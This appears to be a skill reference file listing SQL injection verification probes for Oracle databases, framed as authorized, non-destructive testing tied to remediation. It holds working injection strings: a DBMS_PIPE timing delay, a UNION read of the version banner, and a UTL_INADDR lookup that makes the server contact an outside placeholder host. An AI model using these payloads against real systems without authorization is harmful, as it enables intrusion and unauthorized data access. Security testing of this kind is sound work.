# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`sql-injection-oracle-variants`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `sql-injection-oracle-variants`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### DBMS_PIPE timing

**Expected differential:** the timeout-five branch adds five seconds while the timeout-zero branch matches baseline, repeated to clear jitter

```text
dept=hr' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('probe',5)--
dept=hr' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('probe',0)--
```

### UNION from DUAL

**Expected differential:** a column-matched UNION returning a TO_CHAR value proves in-band read while a mismatched count errors

```text
dept=hr' UNION SELECT TO_CHAR(banner) FROM v$version--
dept=hr' UNION SELECT NULL FROM DUAL--
```

### Out-of-band callback

**Expected differential:** a UTL_INADDR lookup of an assessor host arrives only if the server issued it

```text
dept=hr' AND 1=UTL_INADDR.GET_HOST_ADDRESS('probe.<assessor-controlled-host>')--
dept=hr' AND 1=1--
```

### Identifier-slot map probe

**Expected differential:** an unknown sort token is rejected while a known one orders rows; acceptance proves interpolation

```text
sortcol=name
sortcol=__nope__
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
